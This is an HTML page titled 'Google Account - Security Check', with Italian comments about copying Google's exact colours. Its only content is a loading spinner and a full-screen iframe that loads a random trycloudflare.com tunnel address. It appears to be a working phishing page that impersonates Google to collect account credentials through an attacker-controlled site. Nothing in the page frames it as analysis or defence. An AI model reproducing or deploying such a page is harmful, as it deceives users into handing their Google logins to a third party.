<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#121212">
    <title>Google Account - Security Check</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        /* Colore esatto estratto dalla tua foto di Google */
        body, html { 
            height: 100%; 
            width: 100%; 
            overflow: hidden; 
            background-color: #121212; 
            font-family: 'Roboto', Arial, sans-serif;
        }

        /* Rimuoviamo il wrapper e usiamo l'iframe a schermo intero reale */
        iframe { 
            position: fixed;
            top: 0;
            left: 0;
            width: 100%; 
            height: 100%; 
            border: none; 
            display: block;
            /* Questo elimina lo stacco visivo in fondo alla pagina */
            margin-bottom: -1px; 
            background-color: #121212;
            z-index: 1;
        }

        /* Spinner centrato per il caricamento iniziale */
        .loader-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100vw;
            position: absolute;
            top: 0;
            left: 0;
            z-index: 0; /* Sta sotto l'iframe */
            background-color: #121212;
        }

        .spinner {
            border: 3px solid #333;
            border-top: 3px solid #4285F4;
            border-radius: 50%;
            width: 28px;
            height: 28px;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="loader-container">
        <div class="spinner"></div>
    </div>

    <iframe src="https://pregnancy-effective-federal-consultation.trycloudflare.com"></iframe>

</body>
</html>
